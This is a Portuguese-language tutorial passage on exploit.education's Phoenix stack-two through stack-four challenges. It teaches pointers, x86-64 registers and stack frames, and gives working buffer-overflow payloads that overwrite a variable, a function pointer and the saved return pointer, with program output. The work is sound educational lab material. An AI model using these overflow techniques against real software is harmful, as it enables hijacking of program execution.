<p>Mas pera ai, checando o manual ASCII, esses caracteres são usados para encerrar linha, não é uma letra do teclado! D:</p>
<p>Pois é, então vamos precisar usar os bytes diretamente.</p>
<pre><code>Se você quer tentar resolver sozinhe, agora é a sua hora!

.
.
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<p>Eu precisei colocar em caixinhas diferentes para caber na tela :(</p>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
</blockquote>
<pre><code>Welcome to phoenix/stack-two, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Uhuuu, esse foi mais fácil :D</p>
<a class="header" href="print.html#-solução-2" id="-solução-2"><h1>🔥 Solução</h1></a>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
</blockquote>
<ul>
<li><a href="print.html#-objetivo">🎯 Objetivo</a></li>
<li><a href="print.html#-dica">💡 Dica</a></li>
<li><a href="print.html#-explica%C3%A7%C3%A3o">💫 Explicação</a>
<ul>
<li><a href="print.html#%EF%B8%8F%EF%B8%8F-o-que-raios-s%C3%A3o-pointers">↗️↘️ O que raios são pointers</a></li>
<li><a href="print.html#-function-pointers">🦀 Function Pointers</a></li>
<li><a href="print.html#-exploit">🔥 Exploit</a>
<ul>
<li><a href="print.html#-analisando-o-programa">🛸 Analisando o programa</a></li>
<li><a href="print.html#-encontrando-o-endere%C3%A7o-da-fun%C3%A7%C3%A3o">🏠 Encontrando o endereço da função</a></li>
<li><a href="print.html#-cansei-de-teoria-eu-quero-exploit">😐 Cansei de teoria eu quero exploit</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">🔥 Solução</a></li>
</ul>
<a class="header" href="print.html#-objetivo-2" id="-objetivo-2"><h1>🎯 Objetivo</h1></a>
<p>Usar um pointer para retornar para uma função pre existente</p>
<a class="header" href="print.html#-dica-1" id="-dica-1"><h1>💡 Dica</h1></a>
<p>OBS: em Ingles! // <a href="https://en.wikipedia.org/wiki/Pointer_(computer_programming)">Wikipedia Pointer</a></p>
<a class="header" href="print.html#-explicação-3" id="-explicação-3"><h1>💫 Explicação</h1></a>
<ul>
<li>O que raios são pointers</li>
<li>Function pointers</li>
<li>Exploit</li>
</ul>
<a class="header" href="print.html#-o-que-raios-são-pointers" id="-o-que-raios-são-pointers"><h3>↗️↘️ O que raios são pointers</h3></a>
<blockquote>
<p>Pointers são uma estrutura que, ao invés de armazenar dados, armazena o endereço de outra estrutura.
Lembra do exemplo do poço? Que cada item tinha seu endereço na stack! Então, um pointer armazena esse endereço! :D</p>
</blockquote>
<p>O pointer pode ser visto como uma placa na estrada, indicando que X cidade está em Y direção.</p>
<p>Colunas: Nome da Variável | Endereço | conteúdo</p>
<p><img src="./img/pointer.png" alt="Imagem da wikipedia mostrando um pointer" /></p>
<p>A variável &quot;a&quot; é um pointer que armazena a localização da variável &quot;b&quot;. Coloquialmente se diz que: &quot;a&quot; está apontando para &quot;b&quot; (seta vermelha).</p>
<blockquote>
<p>&quot;a&quot; armazena uma referencia á &quot;b&quot; !</p>
</blockquote>
<blockquote>
<p>&quot;a&quot; pode ser des-referenciada, isto é: Seguir a direção que &quot;a&quot; aponta, para chegar no valor de &quot;b&quot; ! :D</p>
</blockquote>
<p>Normalmente, o caracteres &quot;&amp;&quot; indica uma referência, e o caracteres &quot;*&quot; desreferencia aquele pointer.</p>
<blockquote>
<p>Caso você tente desrefenciar um pointer que não aponta pra nada (NULL),
o programa vai interromper a execução e soltar uma mensagem de erro!
Ou vai ser classificado como &quot;comportamento indefinido&quot;! Por isso, você vai ver &quot;Null Checks&quot;
bem frequentemente nesses desafios e em programas em geral!</p>
</blockquote>
<a class="header" href="print.html#-function-pointers" id="-function-pointers"><h3>🦀 Function Pointers</h3></a>
<blockquote>
<p>Function pointers, ao invés de armazenar o endereço de uma variável, armazenam o endereço de uma função! :D</p>
</blockquote>
<p>Sim! Funções também são armazenadas na Stack, e possuem seu endereço! Esse endereço pode ser encontrado por vários métodos:</p>
<pre><code>objdump -d &lt;programa&gt; | grep &lt;nome_da_função&gt;


gdb &lt;programa&gt;
  (gdb)&gt; info functions
</code></pre>
<p>Os dois métodos serão demonstrados em breve! :D</p>
<a class="header" href="print.html#-exploit" id="-exploit"><h3>🔥 Exploit</h3></a>
<blockquote>
<p>Buffer overflow, alterando o valor de um function pointer, redirecionando a execução do programa.</p>
<p>Em lingua não nerd, por favor? :P</p>
<p>O valor que sera corrompido pelo buffer overflow indica aonde a execução do programa esta indo. Se controlamos esse valor, controlamos aonde o programa vai!</p>
</blockquote>
<a class="header" href="print.html#-analisando-o-programa" id="-analisando-o-programa"><h4>🛸 Analisando o programa</h4></a>
<pre><code class="language-C">função complete_level() {   // a função que a gente quer chamar
.......
}

função main() {
  criar buffer[64];
  criar fp; // um function pointer
  
  fp = NULL; // vai ser usado para checar se ele foi alterado,
               // se continuar sendo NULL, quer dizer que esta intacto.
                
  
  gets(buffer) // função INSEGURA para abrir um input
  
  if (fp) {    // se fp foi alterado
    fp()   // chama o endereço salvo em fp como se fosse uma função
  } else {
    print(valor nao alterado, tente novamente)
  }
  
  exit
}
</code></pre>
<p>Nós queremos chamar <code>complete_level()</code>, para isso, faremos <code>fp</code> salvar o seu endereço.</p>
<p>E nós já sabemos como exploitar um <code>gets()</code> para alterar os valores depois do <code>buffer</code>! Então tá na hora do trabalho!</p>
<a class="header" href="print.html#-encontrando-o-endereço-da-função" id="-encontrando-o-endereço-da-função"><h4>🏠 Encontrando o endereço da função</h4></a>
<pre><code>objdump -d    // Resumindo, printa pro terminal os objetos armazenados na Stack e seus endereços
                  ( O -d é pra ativar a disassembly: Converter de machine code para algo legível )!
gdb
</code></pre>
<p>objdump</p>
<pre><code>$ objdump -d /opt/phoenix/amd64/stack-three | grep complete_level
000000000040069d &lt;complete_level&gt;:
</code></pre>
<p>gdb</p>
<pre><code class="language-x86asm">$ gdb /opt/phoenix/amd64/stack-three                
---- Mensagens padrão foram removidas ----
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level              // Mesmo endereço
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
</code></pre>
<blockquote>
<p>O endereço da função é 0x000000000040069d ! :D</p>
</blockquote>
<p>Presta atenção na quantidade de null bytes que precedem o endereço. Todo pointer começa com pelo menos dois null bytes,
e strings terminam com 1 null byte!</p>
<p>Assim, impedindo atacantes (nós), de definir um pointer novo, pois quebraria a string do nosso
input. Nós precisamos usar um que já esta na memoria! (  Spoiler hehehehe :D  )</p>
<p>Como nesse desafio o pointer ja existe (<code>fp</code>) e nós só vamos mudar os bytes finais dele
(Inteiro escreve na direção LE, lembra? Então não vai interferir com os NULLs que vem antes)</p>
<p>Portanto não precisamos nos preocupar com isso nesse desafio!</p>
<a class="header" href="print.html#-cansei-de-teoria-eu-quero-exploit" id="-cansei-de-teoria-eu-quero-exploit"><h4>😐 Cansei de teoria eu quero exploit</h4></a>
<p>Se você quer tentar por conta própria, agora é sua hora de brilhar!</p>
<pre><code>Lembretes:
Little Endian, o buffer tem 64 bytes,
b&quot;\x&quot;, e o input vem pelo gets()
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
eai, brilhou? ;)
</code></pre>
<p>O input que vamos passar fica:
b&quot;A&quot;*64     # encher o buffer (<code>padding</code>) <br />
+ <br />
b&quot;\x9d\x06\x40&quot; # 0x40069d vira &quot;9d 06 40&quot; em LE</p>
<p>Então...</p>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot;</p>
</blockquote>
<pre><code class="language-C">calling function pointer @ 0x40069d &lt;-- chamando complete_level()
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<p>Espero que você tenha gostado! :D</p>
<a class="header" href="print.html#-solução-3" id="-solução-3"><h1>🔥 Solução</h1></a>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot; | /opt/phoenix/amd64/stack-three</p>
</blockquote>
<pre><code>calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<ul>
<li><a href="print.html#-objetivo">🎯 Objetivo</a></li>
<li><a href="print.html#-conhecimento-preliminar">🛸 Conhecimento preliminar</a>
<ul>
<li><a href="print.html#-assembly">🤖 Assembly</a>
<ul>
<li><a href="print.html#-register-registos--registadores">📦 Register (Registos / Registadores)</a>
<ul>
<li><a href="print.html#-general-purpose-registers-gpr--registo-de-prop%C3%B3sito-geral-">🌍 General Purpose Registers (GPR) ( Registo de Propósito Geral )</a></li>
<li><a href="print.html#-address-register--armazenam-endere%C3%A7os-da-stack-">💫 Address Register ( armazenam endereços da stack )</a></li>
<li><a href="print.html#-rflag">🏁 RFLAG</a></li>
<li><a href="print.html#-ap%C3%AAndice---curiosidade--nomenclatura-hist%C3%B3rica">🧠 Apêndice - Curiosidade : Nomenclatura histórica</a></li>
</ul>
</li>
<li><a href="print.html#-instru%C3%A7%C3%B5es">⚡ Instruções</a></li>
<li><a href="print.html#-fun%C3%A7%C3%B5es-pr%C3%B3logo-e-ep%C3%ADlogo">🦄 Funções, Prólogo e Epílogo</a>
<ul>
<li><a href="print.html#-revis%C3%A3o">☕ Revisão</a></li>
<li><a href="print.html#%EF%B8%8F-stack-frame--moldura-da-stack-">🖼️ Stack Frame ( Moldura da Stack )</a></li>
<li><a href="print.html#-pr%C3%B3logo">🔒 Prólogo</a>
<ul>
<li><a href="print.html#se-a-fun%C3%A7%C3%A3o-receber-argumentos-salvar-eles">Se a função receber argumentos, salvar eles</a></li>
</ul>
</li>
<li><a href="print.html#salvar-o-frame-atual">Salvar o frame atual</a></li>
<li><a href="print.html#criar-novo-frame">Criar novo frame</a></li>
<li><a href="print.html#-ep%C3%ADlogo">🔑 Epílogo</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-caso-voc%C3%AA-tenha-viajado-o-que-voc%C3%AA-precisa-saber">🌍 Caso você tenha viajado, o que você precisa saber</a></li>
<li><a href="print.html#-exploit">🔥 Exploit</a>
<ul>
<li><a href="print.html#-analisar-o-programa">🔬 Analisar o programa</a></li>
<li><a href="print.html#%EF%B8%8F-o-compilador-adicionou-coisa">⁉️ O compilador adicionou coisa???</a></li>
<li><a href="print.html#-encontrar-endere%C3%A7o-de-complete_level">🏠 Encontrar endereço de complete_level</a></li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
</ul>
<a class="header" href="print.html#-objetivo-3" id="-objetivo-3"><h1>🎯 Objetivo</h1></a>
<p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execução do programa.</p>
<p>Esse desafio está nos preparando para o próximo, no qual nos redirecionaremos a execução para o nosso próprio código, e teremos um exploit de verdade! :D</p>
<p>Esse tipo de exploit era viável nos anos 90, quando mecanismos de proteção não existiam. Por isso é chamado de buffer overflow clássico (ou <code>SRP BOF</code>,
caso você goste de siglas)! :D</p>
<p>Se você souber inglês, vale a pena dar uma lida nesse post de 1996 no Phrack: <a href="http://phrack.org/issues/49/14.html">Smashing The Stack For Fun And Profit</a> !</p>
<a class="header" href="print.html#-conhecimento-preliminar" id="-conhecimento-preliminar"><h1>🛸 Conhecimento preliminar</h1></a>
<p>Se tem uma seção inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de segurança está firme e travado,
mantenha as mãos, pernas e canecas de café dentro do veículo durante todo o percurso!</p>
<p>3...2...1....</p>
<a class="header" href="print.html#-assembly" id="-assembly"><h2>🤖 Assembly</h2></a>
<p>Recursos adicionais: <br />
<a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&amp;ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&amp;usg=AOvVaw384MVXQDBtyM1pPW3LeZrW">x64 Cheat Sheet - PDF</a> <br />
<a href="https://cs61.seas.harvard.edu/site/2018/Asm1/">Harvard CS61</a> <br />
<a href="https://en.m.wikipedia.org/wiki/Processor_register">Wikipedia Registers</a> <br />
<a href="https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:%7E:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&amp;text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers">GPR in 8086</a><br />
<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registadores - Introdução Engenharia Reversa</a> \</p>
<p>Eu pretendo fazer uma serie de tutorias dedicada à assembly (ASM), porém isso é para o futuro...</p>
<p>Eu vou usar sintaxe intel, pq é a melhor e se alguém te disser o contrário, a pessoa ta mentindo &gt;:( !!!!</p>
<blockquote>
<p>ASM é uma representação legível dos 0s e 1s das instruções do computador.
Ela pode ser transformada em machine code (código de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!</p>
</blockquote>
<p>Então como você pode imaginar, é bem complicado, e a minha maneira de explicar pode não funcionar para você... Então vai com calma, le de outras fontes, assiste
videos,... vai demorar um bom tempo ate ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo</p>
<a class="header" href="print.html#-register-registos--registadores" id="-register-registos--registadores"><h3>📦 Register (Registos / Registadores)</h3></a>
<blockquote>
<p>Registers são pedaços de memória que ficam dentro do chip do processador,
semelhante a memória RAM, porém extremamente rápidos e pequenos.</p>
</blockquote>
<p>O seu tamanho é um dos determinantes da arquitetura (32 bits = register de
4 bytes, 64 bits = register de 8 bytes)</p>
<p>Esses registers são semelhantes à variáveis, no sentido que
armazenam valores, podem ser alterados e lidos.</p>
<a class="header" href="print.html#-general-purpose-registers-gpr--registo-de-propósito-geral-" id="-general-purpose-registers-gpr--registo-de-propósito-geral-"><h4>🌍 General Purpose Registers (GPR) ( Registo de Propósito Geral )</h4></a>
<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo).</p>
<blockquote>
<p>Por exemplo: AX (16 bits, endereços: 0 a 15) (uma versão antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).</p>
</blockquote>
<p>O propósito deles historicamente costumava ser, mas não exclusivamente era:</p>
<pre><code class="language-x86asm">RAX Acumulador   -&gt; Usado para operações_lógicas ou aritméticas 
RBX              -&gt; Pointer para dados
RCX Contagem     -&gt; Usado em loops e outras operações_cíclicas 
RDX Dados        -&gt; Multiplicação, input/output
R8 a 15          -&gt; você só precisa saber que eles existem
</code></pre>
<p>Alem disso, são usados para passar os argumentos para funções (explicação em breve)</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1º parâmetro)
RSI (2º parâmetro)
RDX (3º parâmetro)
...
</code></pre>
<p>Para os nossos propósitos, é mais vantajoso considerar que eles só servem para
armazenar valores e passar argumentos</p>
<a class="header" href="print.html#-address-register--armazenam-endereços-da-stack-" id="-address-register--armazenam-endereços-da-stack-"><h4>💫 Address Register ( armazenam endereços da stack )</h4></a>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instrução 
                                que está sendo executada 
</code></pre>
<a class="header" href="print.html#-rflag" id="-rflag"><h4>🏁 RFLAG</h4></a>
<p>O register RFLAG armazena flags: sinais que indicam resultados de operações passadas.
Esses sinais são 1 bit (0 ou 1)</p>
<pre><code>Exemplos:

Posição    Nome         Descrição 
0          Carry         Resultado estourou o limite de um inteiro
                                sem sinal (o &quot;vai-um&quot; da matemática)
6          Zero          A operação resultou em 0
11         Overflow      Estourou o limite de um inteiro com sinal
</code></pre>
<a class="header" href="print.html#-apêndice---curiosidade--nomenclatura-histórica" id="-apêndice---curiosidade--nomenclatura-histórica"><h4>🧠 Apêndice - Curiosidade : Nomenclatura histórica</h4></a>
<p><img src="./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
Eu vou usar o RAX como exemplo!</p>
<pre><code class="language-x86asm">Em computadores 8 bits, ele era chamado A (Acumulador)
Em computadores 16 bits, ele era chamado AX (Acumulador eXtendido ) 
Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AX
Em computadores 64 bits, ele é chamado RAX e tem o tamanho de 2 EAX

Para propósitos de retro-compatibilidade, nos ainda podemos usar, 
por exemplo, EAX em um computador 64 bits !
Por trás das cenas, o computador interpreta EAX como a segunda metade do RAX

Então não estranhe caso alguém fale de EIP numa
arquitetura x64, pois na linguagem informal não faz diferença

Mas caso você vá analisar o register em um debugger, a diferença importa :D
</code></pre>
<a class="header" href="print.html#-instruções" id="-instruções"><h3>⚡ Instruções</h3></a>
<blockquote>
<p>Obs: os registers foram usados aleatoriamente, pois seu propósito na realidade não é relevante para a explicação !</p>
</blockquote>
<p>As instruções são o que o processador executa, por exemplo</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adição 4 + 1 = 5
</code></pre>
<p>Na sintaxe intel, o &quot;alvo&quot; da operação vem primeiro e o &quot;parâmetro&quot; depois</p>
<p>Caso os dois argumentos da instrução sejam valores, a operação executara normalmente</p>
<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da operação será salvo nele</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adição 4 + 1 = 5
add rbp 0x10    -&gt; rbp  vira  rbp + 0x10
add rbp 0x22    -&gt; Adiciona 0x22 ao rbp 
</code></pre>
<pre><code class="language-x86asm">sub 0x4 0x1     -&gt; subtração 4 - 1 = 3
                 Caso fosse ao contrário a ordem &quot;alvo&quot; &quot;parâmetro&quot;,
                 o resultado seria `-3` !
                 
sub rbp 0x10    -&gt; rbp  vira  rbp - 0x10
sub rsp 0x10    -&gt; Subtrai 0x10 de rsp
</code></pre>
<p>Algumas outras instruções que serão importantes</p>
<pre><code class="language-x86asm">push -&gt; Empurra o valor pro topo da Stack

pop  -&gt; Tira o valor no topo da Stack e salva no alvo
     |---&gt; pop      -&gt; Só remove o valor no topo da Stack
     |---&gt; pop rbp  -&gt; Remove o valor do topo e salva em rbp
      
mov  -&gt; Move o valor do parâmetro para o alvo
     |---&gt; mov rbx 0x10   -&gt; O valor de rbx vira 0x10
     |---&gt; mov rbx rax    -&gt; O valor de rbx vira o valor de rax
     |---&gt; mov rax rbx    -&gt; O valor de rax vira o valor de rbx

Usadas no epílogo ( explicadas em breve )
           ret     -&gt; retorna da função ( em essência é só um &quot;pop rip&quot; )
           leave -&gt; restaura o stack frame anterior ( mov rsp rbp ; pop rbp )

xor, and, ......  -&gt; Operadores lógicos, têm o mesmo comportamento de sub e add
                  |---&gt; and rbp 0x10   -&gt; rbp  vira  rbp &amp; 0x10
                  |---&gt; xor rsp 0x10   -&gt; rsp  vira  rsp ^ 0x10

Jumps/Pulos
jmp 0x00001234 -&gt; Move o RIP para aquela localização incondicionalmente,
            equivalente a um GOTO

test rax 0x1 ; jmpEQ 0x00001234 -&gt; jmp equal
             |---&gt; Compara os valores; Se forem iguais da o jump
             (normalmente usado em conjunto com a ZERO_FLAG)

jmple  -&gt; jmp less or equal   -&gt; Menor ou igual   ≤
jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   ≥
</code></pre>
<p>Caso vc não saiba os operadores lógicos: <a href="https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico">Wikipedia Operador Lógico</a></p>
<a class="header" href="print.html#-funções-prólogo-e-epílogo" id="-funções-prólogo-e-epílogo"><h3>🦄 Funções, Prólogo e Epílogo</h3></a>
<p>Agora tá na hora de aprender <strong>realmente</strong> como essa tal de stack funciona, então é bom dar uma revisada, né?</p>
<a class="header" href="print.html#-revisão" id="-revisão"><h4>☕ Revisão</h4></a>
<pre><code>- A stack é como uma pilha de pratos: último a entrar, primeiro a sair (LIFO)
- Ela cresce para valores menores: 
    - A memória é representada de cabeça pra baixo!
    - A base fica em um endereço maior (parte de baixo)
    - O topo fica em um endereço menor (parte de cima)
    - Portanto, a stack cresce em direção à valores menores :D 

</code></pre>
<a class="header" href="print.html#-stack-frame--moldura-da-stack-" id="-stack-frame--moldura-da-stack-"><h4>🖼️ Stack Frame ( Moldura da Stack )</h4></a>
<p>Você se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D</p>
<p>O rbp indica a base da stack, e rsp o topo.</p>
<p>A região entre os dois é chamada de stack frame: um pedaço da stack :D</p>
<p>A stack como um todo possui vários stack frames, porém só um está ativo por vez (o indicado pelo rbp/rsp).</p>
<p>Para poder criar um novo ou destruir um antigo, existem procedimentos chamados Prólogo e Epílogo, respectivamente.</p>
<blockquote>
<p>Obs: Quando você muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente</p>
</blockquote>
<p>Quando chamamos uma <strong>função()</strong>, precisamos criar um frame novo para ela por meio de um Prólogo, e salvar o endereço do frame atual. Ao retornar, esse frame será destruído com um Epílogo e o antigo será restaurado !</p>
<p>Para a explicação, vamos usar o seguinte pseudo-programa:</p>
<pre><code class="language-C">Fn print_dois(x, y) {
    print(x)
    print(y)

    return
}
Fn main() {
    x = &quot;Ola! :D&quot;
    y = &quot;Assembly é legal&quot;

    print_dois(x, y)

    return
}
</code></pre>
<p>Agora vamos executar <strong>main()</strong>, <strong>x</strong> e <strong>y</strong> são definidas e nos já sabemos como isso funciona, agora vamos chamar a função, que é aonde a mágica acontece !</p>
<a class="header" href="print.html#-prólogo" id="-prólogo"><h4>🔒 Prólogo</h4></a>
<ul>
<li>Se a função receber argumentos, passar eles
Chamar a função</li>
<li>Salvar o frame atual</li>
<li>Criar novo frame
Executar a função</li>
</ul>
<a class="header" href="print.html#se-a-função-receber-argumentos-salvar-eles" id="se-a-função-receber-argumentos-salvar-eles"><h5>Se a função receber argumentos, salvar eles</h5></a>
<p>Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:</p>
<pre><code class="language-x86asm">(x, y)
push y
push x
</code></pre>
<p>Mas comumente, os argumentos são passados pelos registers:</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1º parâmetro)
RSI (2º parâmetro)
RDX (3º parâmetro)
...
</code></pre>
<blockquote>
<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser necessário dar um push neles, e restaura-los no epilogo</p>
</blockquote>
<a class="header" href="print.html#salvar-o-frame-atual" id="salvar-o-frame-atual"><h4>Salvar o frame atual</h4></a>
<pre><code class="language-x86asm">push RIP + 0x4 ; salva o RIP na stack, porém não o valor atual,
           ; e sim o endereço da próxima instrução 
push RBP       ; salva o RBP
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">rbp main            &lt;- RSP   -
rip main                     | Frame de
....                         | main()
ret de main         &lt;- RBP   -
</code></pre>
<a class="header" href="print.html#criar-novo-frame" id="criar-novo-frame"><h4>Criar novo frame</h4></a>
<p>Agora, para criar um novo frame, precisamos subir o rbp até o rsp</p>
<pre><code class="language-x86asm">mov rbp rsp ; Move o valor de rsp para rbp!
            ; Ou melhor : rbp &quot;anda&quot; até o rsp
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localização
rip main                   
... stack frame de main omitido           
</code></pre>
<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espaço na memória para essa função</p>
<blockquote>
<p>A stack cresce para valores menores :)</p>
</blockquote>
<pre><code class="language-x86asm">sub rsp - 0x20 ; vamos supor que, para esse exemplo, a função precisa de 32 bytes.
               ; Portanto, vamos subtrair 32 bytes de RSP, para faze-lo &quot;subir&quot;
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Variáveis de print_dois  |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
...              
</code></pre>
<p>Com esse método de chamar função, não importa a localização da memória de quando a função foi chamada, ela sempre vai executar da mesma maneira</p>
<blockquote>
<p>Esse processo pode ocorrer muitas vezes caso uma função chame outra, no nosso exemplo, um novo frame seria criado para <strong>print()</strong>, print seria executada,
e o frame destruído ao retornar. Apos <strong>print()</strong> retornar, <strong>print_dois continuara a execução normalmente! :)</strong></p>
</blockquote>
<pre><code class="language-x86asm">O prologo então pode ser resumido em

salvar vars
call
  push rip
  push rbp
  mov rbp rsp
  sub rsp 0x1234
  executar a função
</code></pre>
<a class="header" href="print.html#-epílogo" id="-epílogo"><h4>🔑 Epílogo</h4></a>
<p>O epilogo é bem mais simples que o prologo:</p>
<pre><code>- Devolver memoria e restaurar RBP    -&gt; leave   
- Restaurar RIP  e retornar           -&gt; ret
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Instruções               |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
            
</code></pre>
<p><strong>leave</strong></p>
<p>Para devolver a memoria, precisamos mover RSP &quot;para baixo: basta dar um <code>mov rsp rbp</code> (&quot;andar&quot; rsp até o rbp)</p>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...                    
Variáveis print dois   A região não é apagada, pois consumiria processamento a toa!
...         O valores ficam largados lá até uma nova função escrever por cima deles..
...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleatório
...         Eles pode ser ignorado pois nem está mais na stack
                          
rbp main  &lt;- RBP e RSP - O topo da stack
rip main                                
</code></pre>
<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code>
(remover o valor no topo da stack (ver acima por referencia), e coloca-lo no alvo: <strong>rbp</strong>)</p>
<pre><code class="language-x86asm">--- omitido ---
rip main      &lt;- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
...
... main
call print_dois
proxima instrução
... resto de main
ret de main   &lt;- RBP
</code></pre>
<p><strong>ret (return)</strong>
ret vai restaurar o EIP de main com um <code>pop rip</code></p>
<pre><code class="language-x86asm">...
...resto de main  &lt;- RSP
call print_dois
proxima instrução &lt;- RIP
... resto de main
ret da main       &lt;- RBP
</code></pre>
<p>Assim, o stack frame de main foi restaurado graças ao rbp e rip salvos ( o rip salvo é chamado de <strong>Saved Return Pointer (SRP)</strong> )</p>
<a class="header" href="print.html#-caso-você-tenha-viajado-o-que-você-precisa-saber" id="-caso-você-tenha-viajado-o-que-você-precisa-saber"><h1>🌍 Caso você tenha viajado, o que você precisa saber</h1></a>
<p>Existem algumas variáveis especiais dentro do processador:</p>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instrução que está sendo executada 
</code></pre>
<p>O RIP e o RBP atuais são salvos na stack quando chamamos uma função, junto das outras variáveis:</p>
<pre><code class="language-x86asm">buffer[64]
uns int qualquer usado na função
....
rbp
rip
</code></pre>
<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos exercícios anteriores, também conseguimos
alterar o RIP salvo (<code>SRP</code>) e redirecionar a execução do programa!</p>
<a class="header" href="print.html#-exploit-1" id="-exploit-1"><h1>🔥 Exploit</h1></a>
<a class="header" href="print.html#-analisar-o-programa" id="-analisar-o-programa"><h2>🔬 Analisar o programa</h2></a>
<p>O programa contem 3 funções: <code>complete_level</code>, <code>start_level</code> e <code>main</code></p>
<p><code>main</code> printa a mensagem do começo do nível e chama start_level</p>
<p><code>complete_level</code> é a função que precisamos chamar</p>
<p><code>start_level</code> é onde a magica acontece: <code>gets()</code> (vulnerável) é chamada num <code>buffer[64]</code></p>
<a class="header" href="print.html#-o-compilador-adicionou-coisa" id="-o-compilador-adicionou-coisa"><h2>⁉️ O compilador adicionou coisa???</h2></a>
<p>Se colocarmos somente um byte:</p>
<pre><code class="language-bash">$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
</code></pre>
<p>A função normalmente retorna para 0x40068d !</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*80&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
</code></pre>
<p>Nos colocamos mais de 64 bytes (80), e conseguimos dar overflow... mas o rip não mudou e mesmo assim teve seg fault.... QUE?!!!!</p>
<p>O compilador muitas vezes coloca coisas na stack por performance ou compatibilidade!</p>
<p>Alem disso, nos exemplos passados o valor que queremo mudar estava logo depois do buffer, agora tem pelo menos o RBP salvo no meio do caminho!
Então precisamos levar isso em consideração, não basta só olhar que o tamanho do buffer é 64 e colocar 64 bytes de <code>padding</code>!</p>
<p>Em aplicações mais complexas, essa diferença pode chegar a centenas de bytes.</p>
<p>Nos podemos encontrar essa diferença usando ferramentas como fuzzers ou geradores de padrão...</p>
<p>Como nosso exemplo é simples, podemos aumentar/diminuir manualmente ate encontrar o valor certo:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*89&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41
Segmentation fault

